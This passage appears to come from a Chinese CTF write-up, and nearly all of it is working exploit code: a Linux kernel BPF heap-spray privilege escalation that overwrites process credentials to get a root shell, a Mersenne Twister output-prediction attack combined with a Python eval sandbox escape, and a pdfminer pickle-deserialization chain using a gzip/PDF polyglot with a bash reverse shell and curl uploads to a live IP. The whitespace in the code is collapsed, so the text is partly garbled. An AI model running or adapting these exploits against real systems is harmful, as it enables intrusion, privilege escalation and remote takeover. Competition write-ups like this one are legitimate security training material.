processes[i] = child; } return0;}intspawn_root_shell(pid_t*processes){ for(inti =0; i <0x100; i++) { kill(processes[i], SIGCONT); } while(wait(NULL) >0); return0;}intcreate_bpf_array_of_map(intfd,intkey_size,intvalue_size,intmax_entries){ unionbpf_attr attr = { .map_type = BPF_MAP_TYPE_ARRAY_OF_MAPS, .key_size = key_size, .value_size = value_size, .max_entries = max_entries, // .map_flags = BPF_F_MMAPABLE, .inner_map_fd = fd, }; intmap_fd = syscall(SYS_bpf, BPF_MAP_CREATE, &attr,sizeof(attr)); if(map_fd <0) { return-1; } returnmap_fd;}voidmap_init(uint32_tidx,uint32_tfd){ ioctl_arg arg; arg.idx = idx; arg.fd = fd; if(ioctl(ko_fd,0xDEEFBEAD, &arg) <0){ error_quit("map_init error"); }}voiddel_cmd(uint32_tidx){ ioctl_arg arg; arg.idx = idx; if(ioctl(ko_fd,0xBEEFDFFA, &arg) <0){ error_quit("del_cmd error"); }}voidwrite_cmd(uint32_tidx,uint64_tsize,char*buffer){ ioctl_arg arg; arg.idx = idx; arg.size = size; arg.buffer = (uint64_t)buffer; if(ioctl(ko_fd,0xDEADBEEF, &arg) <0){ error_quit("write_cmd error"); }}voidread_cmd(uint32_tidx,uint32_tsize,char*buffer){ ioctl_arg arg; arg.idx = idx; arg.size = size; arg.buffer = (uint64_t)buffer; if(ioctl(ko_fd,0xBEABDEEF, &arg) <0){ error_quit("read_cmd error"); }}voidexploit(){ ko_fd = open("/dev/vuln", O_RDWR); charinbuf[0x1000] = {0}, outbuf[0x1008] = {0}; intspray_fd[0x200]; uint64_t*ibuf = (uint64_t*)inbuf; intarray_fd =-1; intkey =0, vuln_fd =-1; uint64_tval =0xdeadbeef; for(inti =0; i <0x20; i++){ spray_fd[i] = bpf_create_map(BPF_MAP_TYPE_ARRAY,sizeof(int),0x8,0x40,0); if(spray_fd[i] <0){ error_quit("BPF_MAP_TYPE_ARRAY error"); } bpf_update_elem(spray_fd[i], &key, &val,0); } array_fd = bpf_create_map(BPF_MAP_TYPE_ARRAY,sizeof(int),0x159,0x1,0); if(array_fd <0){ error_quit("BPF_MAP_TYPE_ARRAY error"); } for(inti =0x20; i <0x40; i++){ spray_fd[i] = bpf_create_map(BPF_MAP_TYPE_ARRAY,sizeof(int),0x8,0x40,0); if(spray_fd[i] <0){ error_quit("BPF_MAP_TYPE_ARRAY error"); } bpf_update_elem(spray_fd[i], &key, &val,0); } map_init(0, array_fd); *(uint16_t*)&inbuf[0x2b0] =0x2840-0x48; write_cmd(0,0x159, inbuf); for(inti =0; i <0x40; i++){ map_init(1, spray_fd[i]); *(uint64_t*)&outbuf =0; read_cmd(1,8, outbuf); if(*(uint64_t*)&outbuf !=0xdeadbeef){ vuln_fd = spray_fd[i]; break; } del_cmd(1); } if(vuln_fd ==-1){ error_quit("Failed to get the vuln fd"); } for(inti =0x40; i <0x50; i++){ spray_fd[i] = create_bpf_array_of_map(array_fd,sizeof(int),4,0x40); if(spray_fd[i] <0){ error_quit("BPF_MAP_TYPE_ARRAY_OF_MAP error"); } if(bpf_update_elem(spray_fd[i], &key, &array_fd,0)<0){ error_quit("BPF_UPDATE error"); } } uint64_tkernelbase =0; read_cmd(1,8, &outbuf); if(*(uint64_t*)&outbuf !=0xdeadbeef){ kernelbase = *(uint64_t*)&outbuf; kernelbase +=0xffffffff00000000-0x1c42840; printf("kernelbase: %pn", (void*)kernelbase); } else{ error_quit("Failed to get arraymap"); } close(vuln_fd); for(inti =0x50; i <0x80; i++){ spray_fd[i] = bpf_create_map(BPF_MAP_TYPE_ARRAY,sizeof(int),0x280,0x1,0); if(spray_fd[i] <0){ error_quit("BPF_MAP_TYPE_ARRAY error"); } } *(uint64_t*)&inbuf[0x2b0] = kernelbase +0x1c42840; *(uint64_t*)&inbuf[0x2b0+0x18] =2; *(uint64_t*)&inbuf[0x2b0+0x1C] =4; *(uint64_t*)&inbuf[0x2b0+0x20] =0x100; *(uint64_t*)&inbuf[0x2b0+0x24] =0x100000; *(uint64_t*)&inbuf[0x2b0+0x34] =0x56; *(uint64_t*)&inbuf[0x2b0+0x40] =0x100000; *(uint64_t*)&inbuf[0x2b0+0x80] =1; *(uint64_t*)&inbuf[0x2b0+0x88] =1; *(uint64_t*)&inbuf[0x2b0+0x140] =0x100; *(uint64_t*)&inbuf[0x2b0+0x144] =0xffffffff; write_cmd(1,0x280, inbuf); key =0x41, vuln_fd =-1; for(inti =0; i <0x40; i++){ if(bpf_lookup_elem(spray_fd[i], &key, &outbuf) >=0){ vuln_fd = spray_fd[i]; break; } } if(vuln_fd ==-1){ error_quit("Failed to find the vuln fd"); } printf("Begin to find the cred.n"); uint64_tcred =0, nsproxy =0, init_nsproxy = kernelbase +0x2c729c0, init_cred = kernelbase +0x2c72ea0, init_fs = kernelbase +0x2daeb80; intstop =0; pid_tprocesses[0x100]; spawn_processes(processes); for(inti =0; i <0x1000*0x1000&& !stop; i++){ memset(outbuf,0,0x100); if(bpf_lookup_elem(vuln_fd, &i, &outbuf) <0){ error_quit("Failed to get elem"); } for(intj =0; j <0x100; j+=8){ if(memcmp(&outbuf[j],"0rb1t123",8) ==0){ cred = *(uint64_t*)&outbuf[j-0x10]; cred = cred ==0? *(uint64_t*)&outbuf[j-0x8] : cred; nsproxy = *(uint64_t*)&outbuf[j+0x58]; printf("cred: %p nsproxy: %pn", cred, nsproxy); if(cred !=0&& nsproxy !=0){ *(uint64_t*)&outbuf[j-0x10] = init_cred; *(uint64_t*)&outbuf[j+0x58] = init_nsproxy; *(uint64_t*)&outbuf[j+0x40] = init_fs; puts("Find it."); if(bpf_update_elem(vuln_fd, &i, &outbuf,0) <0){ error_quit("Failed to get elem"); } puts("Success change the cred and nsproxy"); stop =1; break; } } } } write(1,"ROOOOOOOOOOOTn",14); spawn_root_shell(processes);}intmain(){ save_user_land(); exploit(); if(getuid() !=0){ puts("Not root."); exit(1); } charbuf[0x100] = {0}; intfd = open("/dev/vda", O_RDONLY); if(fd <0){ puts("File open error."); exit(1); } read(fd, buf,0x100); write(1, buf,0x100);}
```



```
观察 624 个 32 位输出 → 可以完全恢复内部状态。恢复状态后 → 可以预测之后生成的所有随机数。即使用现有 Python 库或脚本（如 mt19937predictor）把这 624 个输出“逆转”成 MT 内部状态。内部状态恢复后，直接调用 MT 的 getrandbits(32) 模拟生成下一次 key2。
```



```
rd = random.Random()defgenerate_random_string(): returnstr(rd.getrandbits(32))
```



```
ifpayload: a=eval(payload, {'__builtin__':{}})
```



```
importrequestsfrommt19937predictorimportMT19937PredictorBASE_URL ="http://49.232.42.74:32642"API_URL =f"{BASE_URL}/api"predictor = MT19937Predictor()session="eyJ1c2VyX2lkIjoiMTY3MTMwNjIxMyIsInVzZXJuYW1lIjoiYXNkIn0.aM5hIw.5jIpRih9JwJO4qRKinlSKpatkpY"print("[*] 收集 key2 输出...")key2_list = []foriinrange(624): resp = requests.post(API_URL, json={"key":"ads"},cookies={"session":session}) # key1 != key2 data = resp.json() print(data) key2 = int(data['message'].split(':')[1]) key2_list.append(key2) if(i+1) %50==0: print(f"收集{i+1}/624")forvalinkey2_list: predictor.setrandbits(val,32)predicted_key2 = predictor.getrandbits(32)print(f"[*] 预测下一个 key2:{predicted_key2}")payload ="[cls for cls in ().__class__.__base__.__subclasses__() if cls.__name__=='Popen'][0]('mkdir -p static && cat /flag > static/flag.txt', shell=True)"resp = requests.post(API_URL, json={"key": predicted_key2,"payload": payload},cookies={"session":session})print("[*] /api 响应：", resp.text)print("[*] 攻击完成,请访问 /static/flag.txt 查看结果")
```



```
[clsforclsin().__class__.__base__.__subclasses__()ifcls.__name__=='Popen'][0]('id', shell=True)
```



```
mkdir -p static && cat /flag > static/flag.txt
```



```
classCMapDB:def_load_data(cls, name: str)-> Any: name = name.replace(" ","") filename ="%s.pickle.gz"% name log.debug("loading: %r", name) cmap_paths = ( os.environ.get("CMAP_PATH","/usr/share/pdfminer/"), os.path.join(os.path.dirname(__file__),"cmap"), )fordirectoryincmap_paths: path = os.path.join(directory, filename) ifos.path.exists(path): gzfile = gzip.open(path) gzfiles = gzfile.read() try: returntype(str(name), (), pickle.loads(gzfile.read())) finally: gzfile.close()raiseCMapDB.CMapNotFound(name)
```



```
high_level.py::extract_pages()pdfinterp.py::PDFPageInterpreter.process_page(page) pdfinterp.py::PDFPageInterpreter.render_contents(resources, contents) pdfinterp.py::PDFPageInterpreter.init_resources(resources) pdfinterp.py::PDFResourceManager.get_font(objid, spec) pdffont.py::PDFCIDFont.__init__(rsrcmgr, spec, strict) pdffont.py::PDFCIDFont.get_cmap_from_spec(spec, strict) cmapdb.py::CMapDB.get_cmap(cmap_name) cmapdb.py::CMapDB._load_data(name)
```



```
try:# just if is a pdfparser = PDFParser(io.BytesIO(pdf_content))doc = PDFDocument(parser)exceptExceptionase:returnstr(e),500
```



```
importzlib, struct, pickle, binasciidefbuild_pdf(abs_base: int)-> bytes: header =b"%PDF-1.7n%xe2xe3xcfxd3n" defobj(n, body: bytes):returnf"{n}0 objn".encode()+body+b"nendobjn" objs = [] objs.append(obj(1,b"<< /Type /Catalog /Pages 2 0 R >>")) objs.append(obj(2,b"<< /Type /Pages /Count 1 /Kids [3 0 R] >>")) page =b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 4 0 R >> >> /Contents 5 0 R >>" objs.append(obj(3, page)) objs.append(obj(4,b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>")) stream =b"BT /F1 12 Tf (hello polyglot) Tj ET" objs.append(obj(5,b"<< /Length %d >>nstreamn"% len(stream) + stream +b"nendstream")) body = header offsets_abs = [] cursor_abs = abs_base + len(header) foroinobjs: offsets_abs.append(cursor_abs) body += o cursor_abs += len(o) # xref stream (/W [1 4 2])：type(1B)+offset(4B BE)+gen(2B) entries = [b"x01"+ struct.pack(">I", off) +b"x00x00"foroffinoffsets_abs] xref_stream = zlib.compress(b"".join(entries)) xref_obj = ( b"6 0 objn" b"<< /Type /XRef /Size 7 /Root 1 0 R /W [1 4 2] /Index [1 5] " b"/Filter /FlateDecode /Length "+ str(len(xref_stream)).encode() +b" >>nstreamn"+ xref_stream +b"nendstreamnendobjn" ) startxref_abs = abs_base + len(body) trailer =b"startxrefn"+ str(startxref_abs).encode() +b"n%%EOFn" returnbody + xref_obj + trailerdefbuild_gzip_with_extra(extra_pdf: bytes, payload: bytes)-> bytes: ID1, ID2, CM =0x1f,0x8b,8 FLG, MTIME, XFL, OS =0x04,0,0,255 iflen(extra_pdf) >65535: raiseValueError("FEXTRA >65535") header = bytes([ID1, ID2, CM, FLG]) header += struct.pack("<I", MTIME) header += bytes([XFL, OS]) header += struct.pack("<H", len(extra_pdf)) header += extra_pdf comp = zlib.compressobj(level=9, wbits=-15) deflated = comp.compress(payload) + comp.flush() crc = binascii.crc32(payload) &0xffffffff isize = len(payload) &0xffffffff trailer = struct.pack("<II", crc, isize) returnheader + deflated + trailerif__name__ =="__main__": cmd ="bash -c 'bash -i >& /dev/tcp/ip/5555 0>&1'" expr = ( "__import__('os').system(%r) or " "{'decode': (lambda self, b: [])}" ) % cmd classP: def__reduce__(self): importbuiltins return(builtins.eval, (expr,)) payload = pickle.dumps(P(), protocol=2) pdf = build_pdf(abs_base=12) poly = build_gzip_with_extra(extra_pdf=pdf, payload=payload) open("evil.pickle.gz","wb").write(poly) assertpoly[:4] ==b"x1fx8bx08x04" assertpoly.find(b"%PDF-") !=-1andpoly.find(b"%PDF-") <1024
```



```
importiodefencode_pdf_name_abs(abs_path: str)-> str: return"/"+ abs_path.replace("/","#2F")defbuild_trigger_pdf(cmap_abs_no_ext: str)-> bytes: enc_name = encode_pdf_name_abs(cmap_abs_no_ext) header =b"%PDF-1.4n%xe2xe3xcfxd3n" objs = [] defobj(n, body: bytes): returnf"{n}0 objn".encode() + body +b"nendobjn" objs.append(obj(1,b"<< /Type /Catalog /Pages 2 0 R >>")) objs.append(obj(2,b"<< /Type /Pages /Count 1 /Kids [3 0 R] >>")) page =b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 5 0 R >> >> /Contents 4 0 R >>" objs.append(obj(3, page)) stream =b"BT /F1 12 Tf (A) Tj ET" objs.append(obj(4,b"<< /Length %d >>nstreamn"% len(stream) + stream +b"nendstream")) font_dict =f"<< /Type /Font /Subtype /Type0 /BaseFont /Identity-H /Encoding{enc_name}/DescendantFonts [6 0 R] >>".encode() objs.append(obj(5, font_dict)) objs.append(obj(6,b"<< /Type /Font /Subtype /CIDFontType2 /BaseFont /Dummy /CIDSystemInfo << /Registry (Adobe) /Ordering (Identity) /Supplement 0 >> >>")) buf = io.BytesIO() buf.write(header) offsets = [] cursor = len(header) foroinobjs: offsets.append(cursor) buf.write(o) cursor += len(o) xref_start = buf.tell() buf.write(b"xrefn0 7n") buf.write(b"0000000000 65535 f n") foroffinoffsets: buf.write(f"{off:010d}00000 n n".encode()) buf.write(b"trailern<< /Size 7 /Root 1 0 R >>n") buf.write(f"startxrefn{xref_start}n%%EOFn".encode()) returnbuf.getvalue()if__name__ =="__main__": abs_no_ext ="/proc/self/cwd/uploads/evil" withopen("trigger.pdf","wb")asf: f.write(build_trigger_pdf(abs_no_ext))
```



```
curl -sS -F "file=@evil.pickle.gz;type=application/pdf;filename=evil.pickle.gz" http://49.232.42.74:31263/upload | sed -n '1,80p'curl -sS -F "file=@trigger.pdf;type=application/pdf;filename=pwned.pdf" http://49.232.42.74:31263/upload | sed -n '1,120p'
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1758687411-wxsync-2025-09-55c5f0a92960f2ef9984c9da2199de9f.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1758687412-wxsync-2025-09-24799b04ff022fa08876ab3ae384dc39.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1758687414-wxsync-2025-09-c779eab3770bfa38abe6b21b88f641f6.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1758687415-wxsync-2025-09-63db62bd803f16127333d023c49fd646.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1758687417-wxsync-2025-09-622218fefee990fe307d8b554833e5f4.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1758687418-wxsync-2025-09-a5888e37926d864addab1e326320d290.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1758687420-wxsync-2025-09-c8cc87695e07845d8ef7d5bc4df7774a.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1758687422-wxsync-2025-09-aef355ec5c776b758e2d4d3a4090813c.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1758687423-wxsync-2025-09-68495c97890334d6394a08b2b780251b.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1758687425-wxsync-2025-09-9c2a726db8809e0b817ae27adb6f4bff.png)